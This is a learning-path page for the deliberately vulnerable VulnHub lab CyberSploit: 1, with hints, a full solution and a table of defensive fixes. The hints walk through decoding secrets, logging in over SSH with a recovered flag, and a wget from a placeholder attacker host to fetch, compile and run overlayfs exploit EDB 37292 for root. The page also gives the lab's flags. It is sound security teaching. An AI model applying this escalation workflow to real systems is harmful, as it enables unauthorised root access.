# Machine 2 — CyberSploit: 1

> **Position:** 2 of 13 · **Band 2 — Very Easy** (global rank **002** of 708)
> **Full writeup:** [`labs/2-002-cybersploit-1/README.md`](../../labs/2-002-cybersploit-1/README.md)

| | |
| --- | --- |
| **Machine** | CyberSploit: 1 |
| **Author** | CyberSploit |
| **Released** | 9 July 2020 |
| **Target** | Ubuntu 14.04.6 (EOL), kernel `3.13.0-32-generic`, Apache 2.4.7, OpenSSH 6.6.1p1 |
| **VulnHub** | [entry/cybersploit-1,506](https://vulnhub.com/entry/cybersploit-1,506/) |
| **Estimated time** | 3–4 hours |

---

## Why this machine is here

This box has **no web application to attack**, no database, no upload filter, no
SQL injection. Its entire difficulty is in *recognition*: recognising an encoding,
and recognising a version range. That is a different skill from the one Machine 1
taught, and it is the one that fails most often in real assessments — people stare
at `eW91dHViZS5jb20=` and see noise.

It is also your first **kernel exploit**, and your first proper practice of the
research workflow `uname -a` → `searchsploit` → **read the exploit** → compile →
run. That workflow is the single most reusable thing in this module.

## Learning objectives

1. **Recognise base64 on sight** and decode it locally — never paste client data
   into a random website.
2. Recognise and decode a **binary** (bit-string) encoding.
3. Read **page source** and `robots.txt` as information sources, not decoration.
4. **Infer a credential** from a recovered secret (a flag reused as a password).
5. Run the professional exploit-research workflow: `uname -a` → `searchsploit` →
   Exploit-DB → **read the source** → pick the right entry.
6. **Transfer a file onto a target** with a Python HTTP server + `wget`, and verify
   it with a checksum.
7. **Compile and run** an exploit with `gcc`, then clean up after it.
8. Explain, out loud, the difference between **encoding, hashing and encryption**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Information disclosure | Username in an HTML comment; base64 blob in `robots.txt` |
| Encoding mistaken for protection | base64 (flag 1), raw **binary** (flag 2), **brainfuck-style** thinking |
| Credential inference | flag 1 *is* the SSH password |
| Weak file permissions | `flag2.txt` mode `664`, world-readable |
| End-of-life OS | Ubuntu 14.04.6 — no security updates at all |
| **Kernel exploit** | **CVE-2015-1328** overlayfs (EDB 37292) · **CVE-2016-5195** Dirty COW |
| Build tooling present on a server | `gcc`, `g++`, `wget` in `/usr/bin` |
| Weak transport crypto | Deprecated 1024-bit DSA SSH host key |
| Verbose banners | `Apache/2.4.7 (Ubuntu)`; ETag leaks inode/size/mtime |

## Read first

- [01 — Foundations](../01-Foundations-Networking-and-Recon.md) — you should already
  be fluent in it after Machine 1.
- [02 — Web Attacks](../02-Web-Attacks.md) §2 (reading headers and HTML).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§1 in full** —
  this machine *is* the practice for the encoding/hashing/encryption table.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) §6 (kernel
  exploits) — but note the warning there about trying kernels *last*; here the kernel
  is the *only* path, which is the exception.

## Before you start — answer these

1. A string is `A-Za-z0-9+/` only, and its length is a multiple of 4. What is it
   probably? What single command confirms it?
2. Is base64 a form of encryption? Justify in one sentence.
3. What does `uname -r` give you, and what do you *do* with that string?
4. Why might a flag you recovered be useful as a password?
5. What is the difference between a *local* privilege-escalation exploit and a
   *remote* one?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

There are only two ports. That is a *very* small attack surface, which means the
information you need is in the **content** of what those ports serve, not in an
unusual service.

Look at the homepage's HTML source. Not the rendered page — the source. Then look at
`/robots.txt`, which most people never read.
</details>

<details>
<summary><strong>Rung 2 — what you are looking for</strong></summary>

The HTML source contains an **HTML comment** with a username. `robots.txt` contains
an **encoded** string. Once you decode it, you have both a flag and — importantly —
something that works as a **password**.

Do the decoding **locally**:

```bash
printf '%s' '<the blob>' | base64 -d; echo
python3 -c "import base64,sys;print(base64.b64decode(sys.argv[1]).decode())" '<the blob>'
```

Check whether the result is itself encoded again. Nesting is common.
</details>

<details>
<summary><strong>Rung 3 — getting in</strong></summary>

The username from the HTML comment plus the decoded string from `robots.txt` as the
password gets you an **SSH** session. Flag 1 is confirmed at that point.

Once inside, `flag2.txt` in the home directory holds a string of **`0`s and `1`s** —
that is binary, not base64. Convert it:

```bash
python3 -c "import sys;print(''.join(chr(int(b,2)) for b in sys.argv[1].split()))" '<bits>'
```

or `echo '<bits>' | tr ' ' '\n' | while read b; do printf "\\$(printf '%03o' $((2#$b)))"; done; echo`
</details>

<details>
<summary><strong>Rung 4 — the escalation</strong></summary>

`uname -a` reports kernel **`3.13.0-32-generic`** on Ubuntu 14.04. That is old, and
`searchsploit` returns several local root exploits. The intended one is the
**overlayfs** bug, **CVE-2015-1328**, Exploit-DB **37292** (`linux/local/37292.c`).

Workflow:

```bash
searchsploit linux kernel 3.13.0 | less        # read the list
searchsploit -m 37292                          # copy it to your cwd
less 37292.c                                   # READ IT. Which flags? Which path?
python3 -m http.server 8000                    # on your attack box
wget http://ATTACKER:8000/37292.c -O ofs.c     # on the target
md5sum ofs.c                                   # verify the transfer
gcc ofs.c -o ofs && ./ofs
id                                             # uid=0(root)
```

**Dirty COW (CVE-2016-5195)** also works here as an alternative.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → only **22** (OpenSSH 6.6.1p1) and **80** (Apache 2.4.7).
2. Homepage **View Source** → HTML comment → username **`itsskv`**.
3. **`/robots.txt`** → a base64 blob → **flag 1:
   `cybersploit{youtube.com/c/cybersploit}`**.
4. `ssh itsskv@TARGET` with **flag 1 as the password** → in.
5. `flag2.txt` (mode 664) holds a **binary** string → decode the bits →
   **flag 2: `cybersploit{https:t.me/cybersploit1}`**.
6. `uname -a` → `3.13.0-32-generic` → **EDB 37292, overlayfs CVE-2015-1328** →
   serve over HTTP, `wget`, `gcc`, run → **root**.
7. **`/root/finalflag.txt`** → flag 3.
</details>

## After you finish — review questions

1. Write out the difference between encoding, hashing and encryption, using this
   machine's three secrets as examples. Which of them was *actually* protecting
   anything?
2. Why did you decode locally instead of using an online base64 tool? Give two
   reasons, one operational and one ethical.
3. How did you know which kernel exploit to pick? What would have gone wrong if you
   had chosen one for a different kernel series?
4. Your `gcc` needed no special flags this time. Where in the writeup does it warn
   that older exploits need patched headers or `-z execstack`? What would you check?
5. Ubuntu 14.04.6 is EOL. In a real report, how do you word that finding so a
   manager understands the risk?
6. What artefacts did you leave on this machine? List them, and the command that
   removes each.

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Username in an HTML comment | Comments are served to the client. Never put anything sensitive in HTML — including "temporary" notes |
| Base64 secret in `robots.txt` | `robots.txt` is public by design and read by every scanner. Never store secrets there |
| Flag reused as an SSH password | Credential uniqueness policy; alert on any credential appearing in public content |
| `flag2.txt` mode `664` | `chmod 600`; run a periodic world-readable-file audit in home directories |
| **Ubuntu 14.04.6, EOL** | Upgrade the OS. This is the root cause of findings 5–8 |
| Kernel `3.13.0-32` | Patch, or upgrade. Add `linpeas`-style kernel-CVE checks to your audit baseline |
| `gcc`/`g++`/`wget` on a server | Remove build tooling from production images; it exists only to help an attacker compile locally |
| 1024-bit DSA host key | Regenerate with Ed25519; disable DSA and SSHv1 remnants |
| Verbose `Server:` banner, ETag info leak | `ServerTokens Prod`, `ServerSignature Off`, `FileETag None` |

**The single biggest lesson:** *obfuscation is not confidentiality.* Nothing on this
box was cryptographically protected. Everything was merely inconvenient — and
inconvenience is defeated in one command.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 1 — Basic Pentesting: 1](01-basic-pentesting-1.md) · next: [Machine 3 — DC: 1](03-dc-1.md) · full writeup: [`labs/2-002-cybersploit-1`](../../labs/2-002-cybersploit-1/README.md)._
